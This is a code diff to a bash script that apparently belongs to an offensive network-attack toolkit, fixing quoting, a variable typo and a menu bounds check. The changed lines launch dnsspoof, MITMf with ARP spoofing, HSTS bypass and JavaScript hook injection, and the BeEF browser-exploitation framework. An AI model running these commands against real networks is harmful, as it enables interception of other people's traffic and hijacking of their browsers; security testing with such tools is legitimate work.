@@ -277,7 +277,7 @@ then
 		echo -e "$PAKTC"
 		$READAK
 		export INTIP
-		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
+		xterm -geometry 60x15+0+999999 -e bash -c "dnsspoof -i \"$INTIP\" -f \"$LPATH\"/HOSTS/hosts.txt" & disown
 	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
 	then
 		clear
@@ -956,7 +956,7 @@ do
 				then
 					SSC="$YS"
 				else
-					SSC="$WS"
+					SSC="$WHS"
 				fi
 				if [[ "$v" -le 9 ]]
 				then
@@ -1186,7 +1186,7 @@ do
 			then
 				break
 			fi
-			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
+			if [[ "$DCH" -le 0 || "$DCH" -gt "$NDB" ]]
 			then
 				echo -e """$RS""Wrong choice""$CE"""
 				sleep 2
@@ -1897,9 +1897,9 @@ function browser_exploiting
 							clear
 							if [[ "$wholenetwork" == 0 ]]
 							then
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --target ""$TAR"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e bash -c "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --target ""$TAR"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
 							else
-								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
+								xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e bash -c "python mitmf.py -i ""$mitmfint"" --spoof --arp --gateway ""$mitmfgate"" --hsts --inject --js-url ""$mitmfhook"" && echo -e '' && echo -e 'Close this window manually'"  & disown
 							fi
 							cd || exit
 						else
@@ -1938,7 +1938,7 @@ function browser_exploiting
 			fi
 			cd /usr/share/beef-xss || exit 
 			beefrunning=1
-			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
+			xterm -T "BEEF" -hold -geometry 80x15+9999+0 -e bash -c "./beef && echo -e '' && beefrunning=0 && export beefrunning && echo -e 'Close this window manually'" & disown
 			cd || exit
 		elif [[ "$AEB" = 0 ]]
 		then
